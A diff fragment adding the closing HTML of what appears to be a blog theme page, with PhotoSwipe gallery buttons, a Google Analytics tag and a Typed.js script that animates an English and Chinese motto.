+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
